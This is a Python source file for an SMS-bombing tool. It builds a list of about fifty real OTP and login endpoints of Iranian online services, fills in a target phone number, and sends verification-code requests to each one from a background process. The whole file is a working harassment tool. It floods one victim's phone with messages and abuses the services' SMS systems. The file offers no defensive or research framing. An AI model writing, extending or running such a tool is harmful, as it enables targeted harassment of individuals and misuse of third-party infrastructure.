from secrets import token_hex
from multiprocessing import Process,cpu_count
from concurrent.futures import ProcessPoolExecutor
from bomber.requests import postRequest,getRequest,asyncio

class Bomber(Process):
    process = {}
    def __init__(self,target,task_id):
        super().__init__()
        self.name = task_id
        self.target = target
        self.apis = [
            {"url":"https://api.digikala.com/v1/user/authenticate/","paramet":{"username":"{target}"},"method":"POST"},
            {"url":"https://i.devslop.app/app/ifollow/api/otp.php","paramet":"number={target}&state=number&","method":"POST"},
            {"url":"https://chamedoon.com/api/v1/membership/guest/request_mobile_verification","paramet":{"mobile":"{target}"},"method":"POST"},
            {"url":"https://www.pubisha.com/login/checkCustomerActivation","paramet":{"mobile":"{target}"},"method":"POST"},
            {"url":"https://www.shab.ir/api/fa/sandbox/v_1_4/auth/number-mobile","paramet":{"mobile":"{target}"},"method":"POST"},
            {"url":"https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=4e012cac-7c9d-4a6f-b21e-c90fbe775139&locale=fa","paramet":{"cellphone":"{target}"},"method":"POST"},
            {"url":"https://hiword.ir/wp-json/otp-login/v1/login","paramet":{"identifier":"{target}"},"method":"POST"},
            {"url":"https://abantether.com/users/register/phone/send/","paramet":{"phoneNumber":"{target}"},"method":"POST"},
            {"url":"https://api.bit24.cash/api/v3/auth/check-mobile","paramet":{"mobile":"{target}"},"method":"POST"},
            {"url":"https://dicardo.com/main/sendsms","paramet":{"phone":"{target}"},"method":"POST"},
            {"url":"https://ghasedak24.com/user/ajax_register","paramet":{"username":"{target}"},"method":"POST"},
            {"url":"https://tikban.com/Account/LoginAndRegister","paramet":{"CellPhone":"{target}"},"method":"POST"},
            {"url":"https://www.digistyle.com/users/login-register/","paramet":{"loginRegister[email_phone]":"{target}"},"method":"POST"},
            {"url":"https://mobapi.banimode.com/api/v2/auth/request","paramet":{"phone":"{target}"},"method":"POST"},
            {"url":"https://banankala.com/home/login","paramet":{"Mobile":"{target}"},"method":"POST"},
            {"url":"https://www.iranketab.ir/account/register","paramet":{"UserName":"{target}"},"method":"POST"},
            {"url":"https://ketabchi.com/api/v1/auth/requestVerificationCode","paramet":{"phoneNumber":"{target}"},"method":"POST"},
            {"url":f"https://join.tapsi.ir/smsConfirm?phoneNumber={self.target}","paramet":None,"method":"GET"},
            {"url":"https://www.offdecor.com/index.php?route=account/login/sendCode","paramet":{"phone":"{target}"},"method":"POST"},
            {"url":"https://exo.ir/index.php?route=account/mobile_login","paramet":{"mobile_number":"{target}"},"method":"POST"},
            {"url":"https://shahrfarsh.com/Account/Login","paramet":{"phoneNumber":"{target}"},"method":"POST"},
            {"url":"https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php","paramet":{"phone_email":"{target}"},"method":"POST"},
            {"url":"https://shop.beheshticarpet.com/my-account/","paramet":{"billing_mobile":"{target}"},"method":"POST"},
            {"url":f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={self.target}","paramet":None,"method":"GET"},
            {"url":f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={self.target}","paramet":None,"method":"GET"},
            {"url":"https://www.khanoumi.com/accounts/sendotp","paramet":{"mobile":"{target}"},"method":"POST"},
            {"url":"https://rojashop.com/api/auth/sendOtp","paramet":{"mobile":"{target}"}},
            {"url":"https://dadpardaz.com/advice/getLoginConfirmationCode","paramet":{"mobile":"{target}"},"method":"POST"},
            {"url":"https://api.rokla.ir/api/request/otp","paramet":{"mobile":"{target}"},"method":"POST"},
            {"url":"https://khodro45.com/api/v1/customers/otp/","paramet":{"mobile":"{target}"},"method":"POST"},
            {"url":"https://mashinbank.com/api2/users/check","paramet":{"mobileNumber":"{target}"},"method":"POST"},
            {"url":"https://api.pezeshket.com/core/v1/auth/requestCode","paramet":{"mobileNumber":"{target}"},"method":"POST"},
            {"url":"https://api.timcheh.com/auth/otp/send","paramet":{"mobile":"{target}"},"method":"POST"},
            {"url":f"https://api.helsa.co/api/User/GetRegisterCode?mobileNumber={self.target}&deviceId=050102153736100048967953736091842424&discountCode=&utm_content=&utm_source=&utm_campain=","paramet":None,"method":"GET"},
            {"url":"https://client.api.paklean.com/user/resendCode","paramet":{"username":"{target}"},"method":"POST"},
            {"url":"https://mobogift.com/signin","paramet":{"username":"{target}"},"method":"POST"},
            {"url":"https://api.iranicard.ir/api/v1/register","paramet":{"mobile":"{target}"},"method":"POST"},
            {"url":f"https://pubg-sell.ir/loginuser?username={self.target}","paramet":None,"method":"GET"},
            {"url":"https://tj8.ir/auth/register","paramet":{"username":"{target}"},"method":"POST"},
            {"url":"https://www.digistyle.com/users/login-register/","paramet":{"loginRegister[email_phone]":"{target}"},"method":"POST"},
            {"url":"https://cinematicket.org/api/v1/users/signup","paramet":{"phone_number":"{target}"},"method":"POST"},
            {"url":"https://www.irantic.com//api/login/request","paramet":{"mobile":"{target}"},"method":"POST"},
            {"url":"https://kafegheymat.com/shop/getLoginSms","paramet":{"phone":"{target}"},"method":"POST"},
            {"url":"https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85","paramet":{"cellphone":"{target}"},"method":"POST"},
            {"url":"https://www.delino.com/user/register","paramet":{"mobile":"{target}"},"method":"POST"},
            {"url":"https://alopeyk.com/api/sms/send.php","paramet":{"phone":"{target}"},"method":"POST"},
            {"url":f"https://filmnet.ir/api-v2/access-token/users/{self.target}/otp","paramet":None,"method":"GET"},
            {"url":f"https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{self.target}/sms?cCode=+98","paramet":None,"method":"GET"},
            {"url":"https://1401api.tamland.ir/api/user/signup","paramet":{"Mobile":"{target}"},"method":"POST"},
            {"url":"https://www.offdecor.com/index.php?route=account/login/sendCode","paramet":{"phone":"{target}"},"method":"POST"},
            {"url":"https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code","paramet":{"telephone":"{target}"},"method":"POST"},
            {"url":"https://api.timcheh.com/auth/otp/send","paramet":{"mobile":"{target}"},"method":"POST"},
            {"url":"https://api.digikalajet.ir/user/login-register/","paramet":{"phone":"{target}"},"method":"POST"},
        ]
        self.finish = 0
        self.isnotcurrect = 0
        
    def startBomber(self, url: dict[str,dict]):
        try:
            
            if url["method"] == "POST":
                result = asyncio.run(postRequest(url["url"], data=url["paramet"].format(target=self.target)))
            elif url["method"] == "GET":
                result = asyncio.run(getRequest(url["url"]))
                
            if result.status == 200:
                self.finish += 1
            else: self.isnotcurrect += 1
                
        except:self.isnotcurrect += 1
        
    def run(self):
        # with ProcessPoolExecutor(max_workers=cpu_count()) as executor:
        #     for _ in range(3):
        #         executor.map(self.startBomber, self.apis)
        
        for api in self.apis:
            self.startBomber(api)
            

                        
def startBomber(task_id):
    Bomber.process.get(task_id)["process"].start()
    Bomber.process.get(task_id)["status"] = "starting"

def stopBomber(task_id):
    Bomber.process[task_id]["process"].terminate()
    Bomber.process[task_id]["status"] = "Stoped"

def createBomber(target):
    task_id = token_hex(16)
    Bomber.process[task_id] = {
        "status" : "padding",
        "process" : Bomber(target,task_id),
        "target" : target
    }
    return Bomber.process.get(task_id)["process"]